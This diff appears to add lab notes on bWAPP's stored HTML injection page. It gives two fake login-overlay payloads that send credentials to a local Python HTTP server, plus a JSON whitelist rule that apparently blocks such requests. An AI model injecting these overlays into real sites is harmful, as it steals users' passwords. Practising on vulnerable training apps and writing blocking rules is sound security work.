@@ -1,0 +1,25 @@
+Target: http://192.168.1.104/bWAPP/htmli_stored.php
+
+Payload:
+<div style="position: absolute; left: 0px; top: 0px; width: 1900px; height: 1300px; z-index: 1000; background-color:white; padding: 1em;">Please login with valid credentials:<br><form name="login" method="POST" action="http://0.0.0.0:8000/"><table><tr><td>Username:</td><td><input type="text" name="username"/></td></tr><tr><td>Password:</td><td><input type="text" name="password"/></td></tr><tr><td colspan=2 align=center><input type="submit" value="Login"/></td></tr></table></form></div>
+---or
+<div style="position: absolute; left: 0px; top: 0px; width: 1900px; height: 1300px; z-index: 1000; background-color:white; padding: 1em;">Please login with valid credentials:<br><form name="login" method="GET" action="http://0.0.0.0:8000/"><table><tr><td>Username:</td><td><input type="text" name="username"/></td></tr><tr><td>Password:</td><td><input type="text" name="password"/></td></tr><tr><td colspan=2 align=center><input type="submit" value="Login"/></td></tr></table></form></div>
+
+
+Server: $ python3 -m http.server
+
+Pattern:
+{
+    "on_before_request": [
+      {
+        "white_list": [
+          "https://code.jquery.com/jquery-3.5.1.slim.min.js",
+          "https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js",
+          "https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js",
+          "https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
+        ],
+        "method": ["POST", "GET"],
+        "origin_url": true
+      }
+    ]
+}
